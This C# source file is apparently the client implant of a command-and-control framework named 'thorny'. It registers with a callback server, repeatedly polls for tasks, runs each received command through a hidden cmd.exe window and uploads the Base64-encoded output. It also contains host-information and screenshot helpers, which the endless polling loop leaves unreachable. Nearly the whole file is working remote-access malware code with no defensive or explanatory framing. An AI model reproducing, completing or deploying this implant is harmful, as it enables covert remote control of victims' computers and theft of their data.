using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Drawing;
using System.Windows.Forms;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text.Json;
using Newtonsoft.Json;
using System.Diagnostics;

namespace thorny

{
    class Program
    {
        const string callbackserver = "http://localhost:5000";
        private static readonly HttpClient client = new HttpClient();


        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }


        static string Getinfo()
        {
            String all = String.Format("{0} {1}\\{2} {3}", Environment.GetEnvironmentVariable("COMPUTERNAME"), Environment.GetEnvironmentVariable("USERDOMAIN"), Environment.GetEnvironmentVariable("USERNAME"), Environment.GetEnvironmentVariable("windir"));
            return all;
        }


        public static Bitmap TakeScreenshot(string filePath = null)
        {
            var bounds = Screen.PrimaryScreen.Bounds;
            var bmp = new Bitmap(bounds.Width, bounds.Height);

            using (var g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, bounds.Size);
            }

            if (filePath != null) bmp.Save(filePath);

            return bmp;
        }

        public static async Task<string> uploadcontent(string url, string guid, string data, string taskid)
        {
            var values = new Dictionary<string, string>
            {
                { "data", Base64Encode(data) }
            };

            
            string fullurl = url + "/task/newupload/" + guid + "/" + taskid;
            var content = new FormUrlEncodedContent(values);

            var response = await client.PostAsync(fullurl, content);

            var responseString = await response.Content.ReadAsStringAsync();
            return "";
        }

        public static string execc(string command)
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command);

            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;

            // wrap IDisposable into using (in order to release hProcess) 
            using (Process process = new Process())
            {
                process.StartInfo = procStartInfo;
                process.Start();

                // Add this: wait until process does its work
                process.WaitForExit();

                // and only then read the result
                string result = process.StandardOutput.ReadToEnd();
                return result;
            }
        }

        public static string Pingserver(string url)
        {
            bool isDead = true;

            while (isDead)
            {
                try
                {
                    System.Threading.Thread.Sleep(1);
                    string fullpath = url + "/checkin/newclient";
                    var req = WebRequest.Create(fullpath);
                    req.Method = "GET";
                    var webResponse = req.GetResponse();
                    var webStream = webResponse.GetResponseStream();
                    var reader = new StreamReader(webStream);
                    var data = reader.ReadToEnd();
                    Console.WriteLine(data);
                    if (data.Length == 32)
                    {
                        isDead = false;
                        Console.WriteLine("[*] Connection established with server");
                        Console.WriteLine(data);
                        return data;
                    }
                    else
                    {

                        Console.WriteLine("[!] Guid error");
                    }
                }
                catch (Exception)
                {
                    Console.Write("[!] Error could not connect to server\n");
                    System.Threading.Thread.Sleep(5000);
                }
            }
            return "None";
        }


        public class Task
        {
            public string argument;
            public string task_type;
            public string task_id;
        }

        public class Root
        {
            public List<Task> tasks;
        }


        public static void checktask(string url, string guid)
        {
            while (true)
            {
                try
                { 
                    var req = WebRequest.Create(url + "/task/new/" + guid);
                    req.Method = "GET";
                    var webResponse = req.GetResponse();
                    var webStream = webResponse.GetResponseStream();
                    var reader = new StreamReader(webStream);
                    var data = reader.ReadToEnd();
                    Root mydata = JsonConvert.DeserializeObject<Root>(data);
                    string argument = mydata.tasks[0].argument;
                    string tasktype = mydata.tasks[0].task_type;
                    string taskid = mydata.tasks[0].task_id;
                    if (tasktype.Contains("command"))
                    {
                        string output = execc(argument);
                        Console.WriteLine(output);
                        _= uploadcontent(callbackserver, guid, output, taskid);
                        System.Threading.Thread.Sleep(1000);
                    }
                    System.Threading.Thread.Sleep(5000);
                }
                catch (Exception)
                {
                    Console.Write("[!] No new tasks\n ");
                    System.Threading.Thread.Sleep(5000);
                }
            }
        }



        static void Main(string[] args)
        {
            string uuid = Pingserver(callbackserver);
            checktask(callbackserver, uuid);

            Console.WriteLine(Getinfo());
   
            Console.WriteLine("[*]Contacting server..");
            Console.WriteLine("[*]Taking screenshot");
            TakeScreenshot("screenshot.bmp");

        }

    }

 
}
